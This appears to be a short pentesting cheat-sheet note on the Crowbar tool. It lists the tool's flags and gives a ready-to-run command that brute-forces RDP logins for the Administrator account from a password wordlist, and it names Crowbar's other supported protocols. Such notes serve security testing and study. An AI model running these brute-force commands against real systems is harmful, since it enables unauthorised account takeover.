---
title: Crowbar
date: M02-05-2023
author: i4
---

#rdp #brute-force


`Crowbar` can be used to attack RDP authentication.

- `-b` brute target
- `-s` target server
- `-u` username
- `-C` password file
- `-n` amount of threads

```bash
crowbar -b rdp -s [host] -u [user] -C [passwordlist] -n 
```

## Example 
- Attacking RDP
```bash
crowbar -b rdp -s 10.0.0.2/32 -u Administrator -C ./wordlist -n 5
```
## Supported protocols
- openvpn
- rdp
- sshkey
- vnckey